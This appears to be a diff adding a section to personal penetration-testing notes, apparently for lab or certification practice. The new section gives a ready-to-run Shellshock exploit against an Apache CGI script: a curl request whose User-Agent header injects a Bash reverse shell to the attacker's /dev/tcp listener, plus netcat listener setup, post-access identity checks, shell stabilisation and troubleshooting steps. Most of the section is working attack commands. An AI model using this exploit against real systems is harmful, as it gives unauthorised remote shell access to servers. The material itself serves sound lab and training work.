@@ -242,6 +242,33 @@ See [[15. Antivirus Evasion#Capstone 1: Shellter + PuTTY + COMODO + FTP|Capstone
 
 ---
 
+## Apache CGI Shellshock callback
+
+When a CGI identity proof confirms command execution, send the Bash callback through the same header. Start the listener first.
+
+~~~bash
+# Start the callback listener.
+nc -lvnp "$Lport"
+
+# Deliver the Bash callback through the confirmed CGI script.
+curl --max-time 10 -si "http://$BoxIP:$WebPort/cgi-bin/$Script" \
+  -H "User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/$LocalIP/$Lport 0>&1"
+
+# Confirm the identity and host after the connection arrives.
+id
+
+whoami
+
+hostname
+
+# Recover job control in a raw shell, then press Enter once after fg.
+stty raw -echo
+
+fg
+~~~
+
+The /dev/tcp syntax requires Bash. If the harmless proof works but no callback arrives, check LocalIP, listener state, egress, quoting, and the callback port in that order. See [[RUNBOOK V2/Linux - Shellshock CGI|Linux - Shellshock CGI]].
+
 ## Bind Shells
 
 When the target is behind a NAT or firewall blocking inbound connections to your listener, use a bind shell (the target listens, you connect to it).
